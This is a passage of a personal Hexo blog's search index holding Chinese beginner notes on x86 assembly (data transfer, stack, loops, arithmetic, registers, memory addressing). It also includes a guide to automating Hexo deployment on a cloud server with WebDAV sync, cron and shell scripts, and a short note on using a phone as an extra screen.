&#125;&#125;","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"51单片机学习笔记","slug":"学习笔记/51单片机学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/51%E5%8D%95%E7%89%87%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"汇编基础06：数据传送指令","date":"2020-04-04T15:27:19.000Z","path":"wiki/学习笔记/汇编基础学习笔记/汇编基础06--数据传送指令/","text":"汇编基础06：数据传送指令MOV指令格式：MOV OPDR1,OPDR2 功能：将一个源操作数传送到目的操作数中 OPDR1为目的操作数，可以使寄存器、存储器、累加器 OPDR2为源操作数，可以使寄存器、存储器、累加器、立即数 操作数位数需要相同 示例： 123456789.586.MODEL flat, stdcall.codemain proc mov eax ,1 mov ebx ,eax mov eax ,eaxmain ENDPEND main mov指令有这么五种情况 12345mov reg ,regmov mem ,regmov reg ,memmov mem ,immmov reg ,imm 从内存存到内存需要一次中转 12mov reg ,memmov mem ,reg 把低位的值赋给高位的寄存器 1234mov reg32 ,reg 16;mov eax ,cxmov eax ,FFFFFFFF ;初始化mov ax ,cx ；赋值 MOVZXmov进行全0扩展和数据传送 会把位数不够的值进行0填充（二进制） 12mov eax,cx;正常会出错movzx eax,cx MOVSX填充1（二进制），类似movzx LAHF把flag复制到ah里 1lahf SAHF把ah复制到flag里 LEA指令有效地址传送指令 格式：LEA OPDR1,OPDR2 功能：将源操作数给出的有效地址传送到制定寄存器中 OPDR1必须是寄存器 将OPDR2的内存地址给了OPDR1 示例： 12345678.586.MODEL flat, stdcall.codemain proc lea eax ,dword ptr ss:[esp-4] mov eax ,eaxmain ENDPEND main XCHG指令数据交换指令 格式：XCHG OPDR1, OPDR2 功能，两个操作数的值互换 只有内存和寄存器参与 示例： 12345678.586.MODEL flat, stdcall.codemain proc xchg eax ,dword ptr ss:[esp-4] mov eax ,eaxmain ENDPEND main","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"汇编基础学习笔记","slug":"学习笔记/汇编基础学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"汇编基础05：堆栈","date":"2020-04-04T14:27:19.000Z","path":"wiki/学习笔记/汇编基础学习笔记/汇编基础05--堆栈/","text":"汇编基础05：堆栈栈 栈是一种后进先出的存储区域，位于堆栈段中，SS段寄存器描述的就是堆栈段的段地址 栈的数据出口位于栈顶，也就是esp寄存器指向的位置 栈顶是低位，也就是地址较小的一侧，由ebp寄存器指向栈底，不会改变 作用： 存储少量数据 保存寄存器环境 传递参数 栈操作PUSH：压栈指令，32位汇编首先ESP-4，留出一个空间，然后把要压入栈中的内容压入 POP：出栈指令，32位汇编首先将栈顶的数据弹出给指定目标，然后ESP+4，清理空间 pushfd：把eflags压栈 popfd：把eflags出栈 pushad：压栈寄存器 顺序：eax,ecx,edx,ebx,esp,ebp,esi,edi popad：出栈寄存器 pusha：进16位 popa 示例：反转字符串12345678910111213141516171819202122232425.data sstr byte &quot;hello world 1234567!&quot;,0 sstrsize &#x3D; ($ - sstr) - 1 ;等号伪指令，类似于EQU，用于定义常量，但定义的变量可以重新定义.codemain proc xor esi ,esi mov ecx ,sstrsizel1: movzx eax ,sstr[esi] push eax inc esi ;esi作为数组下标使用 loop l1 xor esi ,esi mov ecx ,sstrsizel2: pop eax mov sstr[esi] ,al inc esi loop l2 push 0 call ExitProcessmain endpEND main","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"汇编基础学习笔记","slug":"学习笔记/汇编基础学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"汇编基础04：循环","date":"2020-04-04T13:27:19.000Z","path":"wiki/学习笔记/汇编基础学习笔记/汇编基础04--循环/","text":"汇编基础04：循环循环控制指令：LOOP 格式：LOOP 标号 功能：(CX) &lt;–（CX）-1，（CX）&lt;&gt;0，则转移至标号处循环执行，直至(CX)=0，继续执行后续指令 LOOP执行一次，cx-1，如果cx=0，则会无限循环 示例： 12345678910111213.586.MODEL flat, stdcall.codemain proc mov eax ,1 mov ebx ,1 mov ecx ,3s: add eax ,ebx loop s mov eax ,eaxmain ENDPEND main 练习：1+2+3+…+100 123456789101112.586.MODEL flat, stdcall.codemain proc mov eax ,0 mov ecx ,100s: add eax ,ecx loop s mov eax ,eaxmain ENDPEND main 练习：1+2+4+8+….+2147483648(0x80000000) 123456789101112131415.586.MODEL flat, stdcall.codemain proc mov eax ,1 mov ebx ,0 mov ecx ,32s: mov edx ,2 add ebx ,eax mul edx loop s mov eax ,eaxmain ENDPEND main","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"汇编基础学习笔记","slug":"学习笔记/汇编基础学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"汇编基础03：数学运算&逻辑运算","date":"2020-04-04T12:27:19.000Z","path":"wiki/学习笔记/汇编基础学习笔记/汇编基础03--数学运算&逻辑运算/","text":"汇编基础03：数学运算&amp;逻辑运算数字运算进制度量单位 加法加法指令：ADD 格式：ADD OPRD1 ,OPRD2 功能：两数相加 加法指令运算结果对CF，SF，OF，PF，ZF，AF都有影响，不允许OPRD1 和OPRD2同时为存储器 带进位的加法指令：ADC 功能：OPDR1= OPDR1 + OPDR2 + CF 结果放在操作数1里 示例： 12345678910.586.MODEL flat, stdcall.codemain proc mov eax ,5 mov ebx ,5 add eax ,ebx mov eax ,eaxmain ENDPEND main 减法减法指令：SUB 格式：SUB OPRD1,OPRD2 功能：两个操作数相减，从OPDR1中减去OPDR2，结果保存在OPDR1中 立即数不能用于目的操作数，两个存储器之间的操作数之间不能直接相减，操作数可为8位或16位的无符号数或带符号数 带借位减法指令：SBB 格式：SBB OPDR1,OPDR2 功能：OPDR1 = OPDR1 - OPDR2 -CF 示例： 12345678910.586.MODEL flat, stdcall.codemain proc mov eax ,15 mov ebx ,5 sub eax ,ebx mov eax ,eaxmain ENDPEND main 乘法无符号位乘法指令：MUL 格式：MUL OPDR 带符号位乘法指令：IMUL 格式：IMUL OPDR 功能：乘法操作 OPDR位通用寄存器或存储器操作数 本指令影响标志位：CF，OF 乘法指令是将操作数*EAX，并将结果返回EAX，所以只需要一个操作数 示例： 12345678910.586.MODEL flat, stdcall.codemain proc mov eax ,2 mov ebx ,5 mul ebx mov eax ,eaxmain ENDPEND main 除法【待解决疑问】无符号位除法指令：DIV 格式：DIV OPDR 有符号位除法指令：IDIV 格式：IDIV OPDR 功能：实现两个带符号数的二进制除法运算 16bit的被除数，商放在AL，余数放在AH 32bit的被除数，商放在AX，余数放在DX 64bit的被除数，商放在EAX，余数放在EDX 128bit的被除数，商放在RAX，余数放在RDX 示例： 123456789101112.586.MODEL flat, stdcall.codemain proc mov ax,1000 mov bl,50 div bl mov ah,ah mov al,al mov eax,eaxmain ENDPEND main 出现的问题： vs2015里面不能看到变量的变化 自增+1指令：INC 格式：INC OPDR 功能：OPDR = OPDE +1 示例： 12 自减-1指令：DEC 格式：DEC OPDR 功能：OPDR = OPDE -1 逻辑运算 与指令：AND 格式：AND OPDR1，OPDR2 影响标志位PF、SF、ZF，使CF = 0 ，OF= 0 主要用于修改操作数或置某些位为零 或指令：OR 格式：OR OPDR1，OPDR2 异或指令：XOR 格式：XOR OPDR1，OPDR2 非指令：NOT 格式：NOT exp neg mem转换成二进制补码,也就是补码+1","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"汇编基础学习笔记","slug":"学习笔记/汇编基础学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"汇编基础02：第一个程序","date":"2020-04-04T11:27:19.000Z","path":"wiki/学习笔记/汇编基础学习笔记/汇编基础02--第一个程序/","text":"汇编基础02：第一个程序Visual Studio 2015 使用：创建汇编项目： 新建项目 模板 ， Visual C++ ， Win32， 控制台程序 名称随便起，确定 选中项目右键“生成自定义”，选择MASM生成规则 右击右边的资源管理器中的源文件，添加，新建项，新建一个.asm后缀的新文件 选中项目右键–属性–链接器–系统–子系统选&lt;控制台(SUBSYSTEM:CONSOLE)&gt; 选中项目右键–属性–链接器–高级–入口点–填写 “main” 写代码运行即可 调试汇编程序： 右击项目名称，选择重新生成，然后点上面工作栏的本地Windows调试器即可 可进行断点执行 通过调试的窗口中可将寄存器显示调出来 高亮插件： 菜单栏–工具–扩展和更新 联机–搜索AsmDude–安装 第一个程序：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354.586;指定指令集，工作在386版本的都行.MODEL flat, stdcall;使用的内存模式：flat（win32使用的内存模式）;函数调用约定：stdcall（用于win32 API）includelib user32.libincludelib kernel32.lib;导入库ExitProcess PROTO, dwExitCode : DWORDMessageBoxA PROTO hWnd : DWORD, lpText : BYTE , lpCaption : BYTE, uType : DWORD;声明的win32API的原型;这里还能写option语句;option casemap:none ;制定是否大小写敏感;段;.data，生成的时候占用空间;.data?未初始化数据段;const常量段，可以读不能写;code代码段，不可写;stack堆栈段，可读可写可执行.dataNumber DWORD 0text db &quot;hello world&quot;,0;数据段，声明多大整多大;定义数据，可读可写，程序直接放在内存里;.data?：不会占用exe的大小，是程序运行的时候申请的;.const：常量，可读不可写.codemain proc;入口点需要自己指定;函数体，可以加参数 mov eax ,5 mov ebx ,6 add eax ,ebx add eax ,Number push 0 push offset text push offset text push 0 call MessageBoxA sub esp ,16 call ExitProcessmain ENDP;结束函数END main;结束程序流程;代码段，所有指令都要写在代码段中;数据段不可执行，代码段可执行 汇编基本元素整数常量 十六进制: 012h 八进制: 12q 十进制: 12d 二进制: 101010b 字符常量 ‘A’ 字符串常量 “asdad” ‘asdasd’ 保留字 指令：mov,lea…. 寄存器：eax,ebx…. 属性：db,dword… 运算符 标识符 只能以下划线字母开头 不能与保留字相同 伪指令 .data offset,invoke 指令 mov eax,12 注释 ; 数据类型整数 byte 8 位 无符号 sbyte 8 位 有符号 word 16位 无符号 sword 16位 有符号 dword 32位 无符号 sdword 32位 有符号 fword 48位 有符号 用于保护模式的远指针 qword 64位 整数 tbyte 80位 整数 实数（浮点数） real4 32位 短实数 real8 64位 长实数 real10 80位 扩展实数 伪指令 db 8位整数 类似c的char 可以保存ASCII dw 16位整数 dd 32位整数或实数 dq 64位整数或实数 dp 80位整数或实数 伪指令&amp;运算符offset 获取偏移量 [地址]是获取地址中的值 ptr：选择“位数”的值，也就是获取值的一部分 type：获取类型的大小 type lengthof：计算数组元素 mov eax ,offset lengthof arr sizeof:数组占用空间 typedef：类似于C语言 pbyte typedef ptr byte 给变量一个别称","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"汇编基础学习笔记","slug":"学习笔记/汇编基础学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"常用工具备忘录","date":"2020-04-04T03:21:13.000Z","path":"wiki/备忘笔记/常用工具汇总/","text":"常用工具备忘录编程类Visual Studio 2015适用平台：Windows 下载地址：https://msdn.itellyou.cn/ 选择功能：在默认配置的基础上， 勾选编程语言中 的 Visual C++和针对 Visual Studio 的 Python 工具 勾选通用Windows应用开发工具 做图类：ProcessOn适用平台：全平台 Web在线工具：https://www.processon.com/ 高效办公类：Spackdesk适用平台：Windows，macOS 官网：https://spacedesk.net/ 简介：Windows下的软件扩展桌面解决方案 Microsoft To Do适用平台：Windows，Android 下载地址：Microsoft应用商店 简介：挺好用的清单软件","tags":[],"categories":[{"name":"备忘笔记","slug":"备忘笔记","permalink":"http://kn0sky.com/categories/%E5%A4%87%E5%BF%98%E7%AC%94%E8%AE%B0/"}]},{"title":"内存","date":"2020-04-02T12:27:19.000Z","path":"wiki/概念笔记/内存/","text":"内存冯诺依曼中用来存储程序和数据的部件叫做存储器，存储器分为主存储器（内存储器）和辅助存储器，主存储器也叫内存 内存的寻址范围32位系统内存的寻址范围是0x00000000-0xFFFFFFFF 最大寻址范围：0xFFFFFFFF+1(4294967296) 1 Byte = 8 bit 1 KB = 1024 Byte 1 MB = 1024 KB 1 GB = 1024 MB 4294967296 Byte = 4 GB （32位系统最大内存是4 GB） 64位系统内存寻址范围：0x0000000000000000 – 0xFFFFFFFFFFFFFFFF 内存和寄存器的区别内存：数量庞大，便宜，速度较慢 寄存器：数量少，昂贵，速度极快，位于CPU内部 内存的5种表现形式立即数： 1MOV EAX,DWORD PTR DS:0x????????] 把后面这个内存给EAX 寄存器： 12MOV EBX ,0x????????MOV EAX ,DWORD PTR DS:[EBX] 寄存器+立即数： 12MOV EBX ,0x????????MOV EAX ,DWORD PTR DS:[EBX + 4] 比例因子： 1[REG + REG * &#123;1,2,4,8&#125;] 数组元素地址 = 数组首地址 + 元素索引 * 数组元素占用空间 123MOV EAX ,0x????????MOV EBX ,0x2MOV ECX ,DWORD PTR DS:[EAX+EBX*4] 比例因子+立即数： 123MOV EAX,0x????????MOV EBX,0x2MOV ECX,DWORDPTRDS:[EAX + EBX*4 +1] 数据存储模式大端序：数据高位在内存低位，数据低位在内存高位，常用于ARM架构 小端序：数据高位在内存高位，数据低位在内存低位，常用于x86、AMD64架构","tags":[],"categories":[{"name":"概念笔记","slug":"概念笔记","permalink":"http://kn0sky.com/categories/%E6%A6%82%E5%BF%B5%E7%AC%94%E8%AE%B0/"}]},{"title":"寄存器逻辑结构","date":"2020-03-31T05:21:13.000Z","path":"wiki/概念笔记/寄存器逻辑结构/","text":"寄存器逻辑结构EAX：累加器，操作数和结果数据累加器，返回值运算结果一般都存在这里 64:RAX 32:EAX 16:AX 8:AH+AL EBX：基地址，DS段的数据指针，在内存寻址的时候存放基地址 64:RBX 32:EBX 16:BX 8:BH+BL ECX：计数器，字符串和循环操作的计数器 64:RCX 32:ECX 16:CX 8:CH+CL EDX：存储部分乘法结果和部分除法被除数 64:RDX 32:EDX 16:DX 8:DH+DL EBP：基址指针，SS段的数据指针 64:RBP 32:EBP 16:BP ESP：栈帧指针，指向栈顶，也叫栈顶指针 64:RSP 32:ESP 16:SP EDI：字符串操作的目标指针，ES段的数据指针 64:RDI 32:EDI 16:DI ESI：字符串操作的原始指针，SS段的数据指针 64:RSI 32:ESI 16:SI","tags":[],"categories":[{"name":"概念笔记","slug":"概念笔记","permalink":"http://kn0sky.com/categories/%E6%A6%82%E5%BF%B5%E7%AC%94%E8%AE%B0/"}]},{"title":"汇编基础01：基础概念","date":"2020-03-30T06:27:19.000Z","path":"wiki/学习笔记/汇编基础学习笔记/汇编基础01--基础概念/","text":"汇编基础01：基础概念汇编语言为什么要学汇编 开发 高级语言内联汇编 Windows内核编程 逆向分析（需要精通汇编） 汇编语言与机器语言的区别 汇编语言是机器语言的助记符，几乎是一一对应的 16/32/64位汇编的区别 16位汇编：实模式，16位处理器内部，最多处理存储长度为16位 32位汇编：保护模式，32位处理器内部，最多处理存储长度为32位 64位汇编：保护模式，64位处理器内部，最多处理存储长度为64位 16位处理器只能运行16位汇编， 64位处理器可以运行64和32位汇编， 32位处理器不能运行16位汇编， 因为模式不一样 基本执行环境32位： 8个32位通用寄存器 标志寄存器：EFLAGS 指令指针寄存器：EIP（记录下一条执行的地址） 64位： 8个64位通用寄存器 标志寄存器：RFLAGS 指令指针寄存器：RIP（记录下一条执行的地址） EFLAGS 寄存器包含了独立的二进制位，用于控制CPU操作，或反应CPU执行的结果 VS中的标志位 MMX 寄存器MMX 寄存器实际上是浮点单元中使用的同样寄存器的别名 XMM 寄存器SIMD的扩展指令集 环境配置 Ollydbg Visual Studio 2015 新建空项目 选中项目右键“生成自定义”，选择MASM生成规则 新建一个.asm后缀的新文件 选中项目右键–属性–链接器–系统–子系统选&lt;控制台(SUBSYSTEM:CONSOLE)&gt; 选中项目右键–属性–链接器–高级–入口点–填写 “main” 寄存器逻辑结构EAX：累加器，操作数和结果数据累加器，返回值运算结果一般都存在这里 64:RAX 32:EAX 16:AX 8:AH+AL EBX：基地址，DS段的数据指针，在内存寻址的时候存放基地址 64:RBX 32:EBX 16:BX 8:BH+BL ECX：计数器，字符串和循环操作的计数器 64:RCX 32:ECX 16:CX 8:CH+CL EDX：存储部分乘法结果和部分除法被除数 64:RDX 32:EDX 16:DX 8:DH+DL EBP：基址指针，SS段的数据指针 64:RBP 32:EBP 16:BP ESP：栈帧指针，指向栈顶，也叫栈顶指针 64:RSP 32:ESP 16:SP EDI：字符串操作的目标指针，ES段的数据指针 64:RDI 32:EDI 16:DI ESI：字符串操作的原始指针，SS段的数据指针 64:RSI 32:ESI 16:SI 冯·诺依曼体系结构分为5个部分 输入设备–存储器–输出设备，运算器–控制器 内存冯诺依曼中用来存储程序和数据的部件叫做存储器，存储器分为主存储器（内存储器）和辅助存储器，主存储器也叫内存 内存的寻址范围32位系统内存的寻址范围是0x00000000-0xFFFFFFFF 最大寻址范围：0xFFFFFFFF+1(4294967296) 1 Byte = 8 bit 1 KB = 1024 Byte 1 MB = 1024 KB 1 GB = 1024 MB 4294967296 Byte = 4 GB （32位系统最大内存是4 GB） 64位系统内存寻址范围：0x0000000000000000 – 0xFFFFFFFFFFFFFFFF 内存和寄存器的区别内存：数量庞大，便宜，速度较慢 寄存器：数量少，昂贵，速度极快，位于CPU内部 内存的5种表现形式立即数：就是阿拉伯数字 1MOV EAX,DWORD PTR DS:0x????????] 把后面这个内存给EAX 寄存器： 12MOV EBX ,0x????????MOV EAX ,DWORD PTR DS:[EBX] 寄存器+立即数： 12MOV EBX ,0x????????MOV EAX ,DWORD PTR DS:[EBX + 4] 比例因子： 1[REG + REG * &#123;1,2,4,8&#125;] 数组元素地址 = 数组首地址 + 元素索引 * 数组元素占用空间 123MOV EAX ,0x????????MOV EBX ,0x2MOV ECX ,DWORD PTR DS:[EAX+EBX*4] 比例因子+立即数： 123MOV EAX,0x????????MOV EBX,0x2MOV ECX,DWORDPTRDS:[EAX + EBX*4 +1] 数据存储模式大端序：数据高位在内存低位，数据低位在内存高位，常用于ARM架构 小端序：数据高位在内存高位，数据低位在内存低位，常用于x86、AMD64架构 操作数类型立即数：数字 imm 立即数 imm8 imm16 imm32 寄存器操作数 reg 通用寄存器 reg8 reg16 reg 32 sreg 段寄存器 内存操作数 mem 内存 mem8 mem16 mem 32 参考资料 EFLAGS寄存器中状态标志（Status Flags）小结 x86—EFLAGS寄存器详解","tags":[],"categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"汇编基础学习笔记","slug":"学习笔记/汇编基础学习笔记","permalink":"http://kn0sky.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"借助云服务器实现hexo全自动部署","date":"2020-03-15T14:36:10.000Z","path":"wiki/折腾笔记/博客搭建/借助云服务器实现hexo全自动部署/","text":"借助云服务器实现hexo全自动部署大家好，我是kn0sky，上一篇我们用hexo搭建了wiki主题个人博客，这次我们来讲讲部署hexo文章我们可以如何偷懒。不想直接把站点文件都传到github上，那自己发布hexo文章需要依次执行3条命令，懒惰的我觉得太麻烦了，于是简单写了个脚本将三条hexo命令简化成一条执行脚本命令，但发布文章还是要执行一条命令啊，还是太麻烦了，后来就在想啊，能不能一条命令也不用输入，完全自动发布文章呢，于是有了本文。 本文的实现思路如下：通过云服务器的定时任务以及和云服务器的实时同步文件来实现全自动部署工作。 本文内容分为如下几部分： 云服务器安装hexo 实现与云服务器的文件实时同步 云服务器定时部署到github page 云服务器安装Hexo安装git和Node.JS首先通过ssh连接到云服务器，具体操作自行百度 我这里使用的云服务器系统是Ubuntu Linux系统，所以本文以Ubuntu Linux为例进行讲解 Ubuntu Linux默认自带git，所以我们还需要自行安装一下Node.JS： 12345678$ wget https://nodejs.org/dist/v12.16.1/node-v12.16.1-linux-x64.tar.xz$ tar -xvf node-v12.16.1-linux-x64.tar.xz $ sudo mv node-v12.16.1-linux-x64 /usr/local/node-v12$ sudo ln -s /usr/local/node-v12/bin/node /bin/node$ sudo ln -s /usr/local/node-v12/bin/npm /bin/npm# 可使用如下命令检测node是否安装成功$ node -v$ npm -v 如果该云服务器是第一次使用git，记得添加一下名称和邮箱 12$ git config --global user.name \"Your Name\"$ git config --global user.email \"email@example.com\" 安装Hexo1234$ npm install -g hexo-cli$ sudo ln -s /usr/local/node-v12/bin/hexo /bin/hexo# 检测hexo是否安装成功$ hexo -v 运行Hexo我们需要先初始化一个hexo目录 1$ hexo init &lt;floder name&gt; 初始化完成后，文件夹结构如下： 12345678.├── _config.yml├── package.json├── scaffolds├── source| ├── _drafts| └── _posts└── themes 其中_config.yml为站点配置文件，themes为主题文件目录 要运行hexo,在hexo的目录下使用如下命令即可： 123$ hexo server# 或者$ hexo s 启动服务器后，默认在4000端口启动web服务，此时访问&lt;ip&gt;:4000即可访问到当前hexo站点，此时站点里默认会有一篇快速入门的文章帮助你快速熟悉hexo的使用 想将自己的hexo博客设置成wiki样式，可参考我的上篇文章《使用hexo搭建wiki》进行配置 将本地配置好的wiki移动到云服务器将本地配置好的服务器打包，上传到云服务器，然后解压即可直接使用，有的插件可能要再次npm装一下 实现到云服务器之间的文件实时同步为了方便我们写文章在本地保存完就直接同步到服务器上，我们可以想办法实现一下文件实时同步，将本地文件夹的修改实时同步到云服务器上，这里有一个现成的解决方案：使用坚果云实时同步文件夹。 这里我们使用坚果云软件，我们的主机上下载好坚果云软件，注册登录，建立一个同步文件夹，这里操作很无脑，就不演示了，接下来讲讲没有图形界面的Linux命令行如何同步坚果云： 坚果云提供WebDav接口，这里可以使用davfs工具去挂载WebDav目录 WebDav:WebDAV （Web-based Distributed Authoring and Versioning） 一种基于 HTTP 1.1协议的通信协议。它扩展了HTTP 1.1，在GET、POST、HEAD等几个HTTP标准方法以外添加了一些新的方法，使应用程序可对Web Server直接读写，并支持写文件锁定(Locking)及解锁(Unlock)，还可以支持文件的版本控制。有利于用户间协同编辑和管理存储在万维网服务器文档 总之，就是常用于网盘的一种网络协议。 davfs:一种连接WebDav网盘的工具 安装davfs21$ sudo apt install davfs2 配置&amp;挂载davfs2编辑配置文件/etc/davfs2/davfs2.conf，找到如下内容将注释去掉，将0改成1 1# ignore_dav_header 0 编辑配置文件/etc/davfs2/secrets，在配置文件最后添加如下内容： 1https:&#x2F;&#x2F;dav.jianguoyun.com&#x2F;dav 你的坚果云账户 你的webdav应用密码 坚果云WebDav应用密码获取方式： 坚果云官网登录你的坚果云账号 依次点击账户信息—安全选项，即可看到添加WebDav应用的按钮 点击添加应用，名称随意输入，然后就会自动生成一个密码 然后进行挂载 1$ sudo mount.davfs https://dav.jianguoyun.com/dav 你想要挂载的目录 接下来访问该目录即可发现目录里的内容已经和我们坚果云账号创建的实时同步文件夹同步了 接下来，我们将我们的hexo主目录source文件下的_post目录放到我们的坚果云实时同步文件夹下，然后在云服务器软链接（ln -s）到云服务器hexo目录的该位置即可，过于简单就不演示了 到此为止，我们在本地写完文章保存后，云服务器会自动同步文章，接下来在云服务器后台启动hexo s即可实时展示博客更新的内容了： 12$ cd 你的hexo的目录$ nohup /bin/hexo server &gt;&gt; ~/hexo.log 2&gt;&amp;1 &amp; 命令含义详见参考资料 通过脚本生成新的文章模板每次创建新的文章都需要通过命令hexo new name进行，hexo程序为我们生成一个文章模板，但是如果我想只在远程服务器上安装hexo，不想在本地安装hexo呢，这里我们通过一个脚本来实现hexo new的功能，这样即使本地没有hexo，也能写hexo的文章，这里直接给出代码了： 123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/pythonimport sysimport timeimport osif not sys.argv[1]: print(\"请输入文章标题\") print(\"例如：python hexonew.py title\") sys.exit()title = sys.argv[1]time = time.strftime(\"%Y-%m-%d %H:%M:%S\",time.localtime())header = f\"\"\"---title: &#123;title&#125; toc: truedate: &#123;time&#125;tags:categories:--- \"\"\"footer = \"\"\"## 参考资料&gt; - []()&gt; - []()\"\"\"text = header + '\\n' + footerurl = os.getcwd() + '/' + title + '.md'with open(url,'w') as f: f.write(text) 通过脚本和命令实现全自动化部署到Github Page为了全自动部署到Github Page，我们可以使用Linux的定时任务，比如每天晚上12点进行一次部署，部署的命令我们写成脚本方便一键执行，这样一来，我们只需要写完内容，然后保存，就能全自动部署到我们的博客上了，而且我们可以在任何机器上写文章，甚至不需要安装任何环境，非常方便。 配置云服务器ssh秘钥连接github生成ssh秘钥 1$ ssh-keygen -t rsa -C \"github邮箱账号\" 找到生成的秘钥，将公钥内容复制，在github上个人设置–SSH and GPG keys–New SSH key添加秘钥 添加完秘钥可使用如下命令测试: 1$ ssh -T git@github.com 这里我遇到了一个错误：git@github.com: Permission denied (publickey)，解决方案我放在参考资料里了。 连接成功的话，会返回类似如下字样： 1Hi kn0sky! You&#39;ve successfully authenticated, but GitHub does not provide shell access. 此时我们到hexo主目录使用一下hexo d命令试一试，此时我们无需输入账号密码即可成功部署 一键脚本使用一键部署脚本便于定时任务的设置，这里使用shell脚本进行部署 不知道什么原因，云服务器的hexo s启动服务器不会因为坚果云同步目录的变更而更新内容，所以这里也定时重启好了 PS：目录地址需要根据自己的情况进行修改 重启脚本： 1234567891011#!/bin/bashcd ~/hexo-wikinum=`ps -elf | grep hexo | grep -v grep | wc -l`if [ $&#123;num&#125; -ne 0 ];then ps -elf | grep hexo | grep -v grep | awk '&#123;print $4&#125;' | xargs kill -9 echo \"[+]已杀死进程\" &gt;&gt; ~/hexo.logfiecho \"--------------\" &gt;&gt; ~/hexo.logecho `date -d now` &gt;&gt; ~/hexo.lognohup /bin/hexo server -p 30808 &gt;&gt; ~/hexo.log 2&gt;&amp;1 &amp; 部署脚本： 123456#!/bin/bashcd ~/hexo-wikinohup hexo clean &amp;&amp; hexo g &amp;&amp; hexo d &gt;&gt; ~/crontab_script/hexo_auto_depoly.log 2&gt;&amp;1 &amp;echo '-----------------------'echo `date -d 'now'` &gt;&gt; ~/crontab_script/blog_auto_deploy.logecho \"[+]完成部署！\" &gt;&gt; ~/crontab_script/blog_auto_deploy.log 这里使用git进行自动部署，git会自动检测提交的内容同上次提交相比是否有变更，如果有，就部署，反之，不部署。 设置定时任务使用crontab工具设置定时任务，使用如下命令进入编辑页面 1$ crontab -e 在配置的最底下添加如下内容： 1234# 每天9点12分的时候运行部署脚本12 9 * * * bash ~/crontab_script/blog_auto_deploy.sh# 每15分钟运行一次hexo 服务重启脚本*/15 * * * * bash ~/crontab_script/blog_auto_server.sh 到此，基本实现hexo全自动部署功能！ 希望对读完的你有所帮助。 参考资料 使用hexo搭建个人wiki 备份Linux操作系统的数据到坚果云的方法 搭建 Node.js 环境 linux shell中”2&gt;&amp;1”含义 nohup和&amp;后台运行，进程查看及终止 git@github.com: Permission denied (publickey) Linux crontab 命令","tags":[],"categories":[{"name":"折腾笔记","slug":"折腾笔记","permalink":"http://kn0sky.com/categories/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/"},{"name":"博客搭建","slug":"折腾笔记/博客搭建","permalink":"http://kn0sky.com/categories/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"}]},{"title":"使用手机扩展电脑屏幕","date":"2020-03-13T10:38:51.000Z","path":"wiki/折腾笔记/手机连接电脑/使用手机扩展电脑屏幕/","text":"Windows 下 使用手机 进行 屏幕扩展多屏幕协同工作可以有效提高工作效率，在一定程度上摆脱窗口反复切换的问题，下面将分别介绍常规和非常规的解决方案。 常规解决方案最常规的方法是整一个显示设备（显示器、投影仪等），HDMI线缆连接，然后显示设置里选择扩展屏幕（也有复制选项） 非常规解决方案通过局域网使用手机/平板/其他Windows电脑进行屏幕扩展这里需要通过spacedesk软件实现，下载地址参考：spacedesk官网 软件分为主机端和扩展端，主机端只能是Windows系统，扩展端可以是Android、Windows、iOS等 软件的安装较为无脑，直接点下一步即可，这里不多啰嗦，Android端apk打不开Google Play商店可通过其他下载站进行下载，例如Freeapk 